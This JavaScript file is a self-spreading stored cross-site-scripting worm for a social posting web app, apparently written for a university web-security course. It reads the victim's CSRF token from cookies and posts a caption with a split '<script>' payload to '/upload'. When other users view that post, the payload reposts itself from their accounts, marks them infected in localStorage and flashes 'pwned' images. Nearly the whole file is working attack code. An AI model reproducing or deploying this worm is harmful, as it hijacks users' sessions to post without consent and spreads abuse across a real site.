document.addEventListener("DOMContentLoaded", () => {

    let session = localStorage.getItem("SESSIONID");

    if (!session) {
        localStorage.setItem("SESSIONID", "584e0ae6dcd0dc93ce82490c0d8d3bfc819ed87c");
    }

    let isAlreadyInfected;

    if (session === "ae0b6badeb338b59cda2135ed783c28beaf6d622") {
        isAlreadyInfected = true;
        displayImage();
    } else {
        isAlreadyInfected = false;
    }
    
    if (isAlreadyInfected) {
        return;
    }
    function displayImage() {
        const images = [
            "https://media.tenor.com/aUGKNa38o-gAAAAe/virus-computer.png",
            "https://res.cloudinary.com/dt3f31hiq/image/upload/v1683101814/pwned_7a5e4d6579.png",
            "https://pbs.twimg.com/media/Gbd3tsPaoAEl-d5.jpg",
            "https://i.ytimg.com/vi/sPUKxtLHPKQ/hqdefault.jpg",
            "https://img.over-blog-kiwi.com/0/74/35/69/20140818/ob_69946c_699x352xscreenshot045-jpg-pagespeed-ic.jpg",
            "https://i.ytimg.com/vi/spoZ2zKnK88/sddefault.jpg",
            "https://www.researchgate.net/publication/376440650/figure/fig1/AS:11431281211491912@1702401485315/Figura-1-meme-o-virus-como-piada.jpg",
        ];

        const randomIndex = Math.floor(Math.random() * images.length);
        const randomImage = images[randomIndex];

        const img = document.createElement("img");
        img.src = randomImage;
        img.style.position = "fixed";
        img.style.top = "50%";
        img.style.left = "50%";
        img.style.transform = "translate(-50%, -50%)";
        img.style.zIndex = "9999";
        img.style.border = "2px solid black";
        img.style.borderRadius = "10px";
        img.style.boxShadow = "0 0 10px rgba(0, 0, 0, 0.5)";
        document.body.appendChild(img);

        setTimeout(() => {
            img.remove();
        }, 5000);
    }

    const text = "AEV é sem dúvida a melhor cadeira de todas! Acho que merecemos todos um 20!";
        const payload = `
                        (function spreadWorm(triggerMessage) {
                        createHiddenPost(triggerMessage);

                        function createHiddenPost(caption) {
                            const formData = new FormData();

                            formData.append("uphoto", "");
                            formData.append("caption", caption);
                            formData.append("sha", "584e0ae6dcd0dc93ce82490c0d8d3bfc819ed87c")

                            fetch("/upload", {
                                method: "POST",
                                body: formData,
                                headers: {
                                    "X-CSRFToken": getCSRFToken(),
                                },
                            })
                                .then((response) => {
                                    if (response.ok) {
                                        tickleWorm()
                                    } else {
                                    }
                                })
                                .catch((error) => {
                                });
                        }
                        function getCSRFToken() {
                            const cookies = document.cookie.split(";");
                            for (let cookie of cookies) {
                                const [key, value] = cookie.trim().split("=");
                                if (key === "csrftoken") {
                                    return value;
                                }
                            }
                            return null;
                        }
                        function displayImage() {
                            const images = [
                                "https://media.tenor.com/aUGKNa38o-gAAAAe/virus-computer.png",
                                "https://res.cloudinary.com/dt3f31hiq/image/upload/v1683101814/pwned_7a5e4d6579.png",
                                "https://pbs.twimg.com/media/Gbd3tsPaoAEl-d5.jpg",
                                "https://i.ytimg.com/vi/sPUKxtLHPKQ/hqdefault.jpg",
                                "https://img.over-blog-kiwi.com/0/74/35/69/20140818/ob_69946c_699x352xscreenshot045-jpg-pagespeed-ic.jpg",
                                "https://i.ytimg.com/vi/spoZ2zKnK88/sddefault.jpg",
                                "https://www.researchgate.net/publication/376440650/figure/fig1/AS:11431281211491912@1702401485315/Figura-1-meme-o-virus-como-piada.jpg",
                            ];

                            const randomIndex = Math.floor(Math.random() * images.length);
                            const randomImage = images[randomIndex];

                            const img = document.createElement("img");
                            img.src = randomImage;
                            img.style.position = "fixed";
                            img.style.top = "50%";
                            img.style.left = "50%";
                            img.style.transform = "translate(-50%, -50%)";
                            img.style.zIndex = "9999";
                            img.style.border = "2px solid black";
                            img.style.borderRadius = "10px";
                            img.style.boxShadow = "0 0 10px rgba(0, 0, 0, 0.5)";
                            document.body.appendChild(img);

                            // Automatically remove the image after 5 seconds
                            setTimeout(() => {
                                img.remove();
                            }, 5000);
                        }

                        function tickleWorm() {
                            const triggerWord = "AEV é sem dúvida a melhor cadeira de todas! Acho que merecemos todos um 20!";
                            const posts = document.querySelectorAll('.card.vichlacard');
                        
                            if (document.body.dataset.wormInjected) return;
                            document.body.dataset.wormInjected = "true";
                        
                            posts.forEach((post) => {
                                if (!post.dataset.tickleWorm) {
                                    post.dataset.tickleWorm = true;
                        
                                    const captionElement = post.querySelector('.card-text.caption');
                                    const captionText = captionElement ? captionElement.textContent : "";
                                    const session = localStorage.getItem("SESSIONID");
                                    const isAlreadyInfected = session == "ae0b6badeb338b59cda2135ed783c28beaf6d622" ? true : false;
                        
                                    if (captionText.includes(triggerWord)) {
                                        if (isAlreadyInfected) {
                                            displayImage()
                                            return;
                                        } else {
                                            spreadWorm(triggerWord);
                                            displayImage()
                                            localStorage.setItem("SESSIONID", "ae0b6badeb338b59cda2135ed783c28beaf6d622");                                   
                                            }
                                    }
                                }
                            })}});`
const script = "<scr"+"ipt>" + payload + "</scr"+"ipt>";

if(isAlreadyInfected){
} else {
    if(session == "584e0ae6dcd0dc93ce82490c0d8d3bfc819ed87c" || !session){
    } else {
        createHiddenPost(text + script);
        localStorage.setItem("SESSIONID", "ae0b6badeb338b59cda2135ed783c28beaf6d622");
    }
}

function createHiddenPost(caption) {
    const formData = new FormData();

    formData.append("uphoto", "");
    formData.append("caption", caption);
    formData.append("sha", "584e0ae6dcd0dc93ce82490c0d8d3bfc819ed87c")

    fetch("/upload", {
        method: "POST",
        body: formData,
        headers: {
            "X-CSRFToken": getCSRFToken(), // Secure with CSRF token
        },
    });
}

// Function to retrieve the CSRF token from cookies
function getCSRFToken() {
    const cookies = document.cookie.split(";");
    for (let cookie of cookies) {
        const [key, value] = cookie.trim().split("=");
        if (key === "csrftoken") {
            return value;
        }
    }
    return null;
}
});